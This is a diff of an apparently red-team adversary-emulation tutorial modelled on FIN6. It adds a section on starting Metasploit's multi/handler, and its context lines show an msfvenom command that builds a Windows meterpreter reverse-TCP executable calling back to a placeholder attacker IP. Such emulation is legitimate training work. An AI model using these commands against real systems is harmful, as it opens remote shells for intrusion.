@@ -30,7 +30,7 @@ Msfvenom has a wide range of options available:
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom.png){:width="100%"}
 
 
-### 1.3 - Generate Initial Access Payload
+### 1.3 - Generate Initial Access Payload 
 
 To generate a payload, there are two flags that you must supply (`-p` and `-f`):
 
@@ -49,6 +49,22 @@ Below is the typical syntax to use msfvenom:
 ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}
+
+### 1.4 - Generate Payload Handler
+
+With our payload ready, we need a handler to accept the connection back from our target. We will use the `exploit/multi/handler` metasploit module.
+
+```
+Module: exploit/multi/handler
+Source code: modules/exploits/multi/handler.rb
+Supported architecture(s): x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r
+Supported platform(s): Android, Apple_iOS, BSD, Java, JavaScript, Linux, Mainframe, Multi, NodeJS, OSX, PHP, Python, Ruby, Solaris, Unix, Windows
+```
+Normally, you can use exploit/multi/handler this way:
+
+```bash
+msf6 > use exploit/multi/handler
+```
 
 ## Step 2 - FIN6 Discovery
 
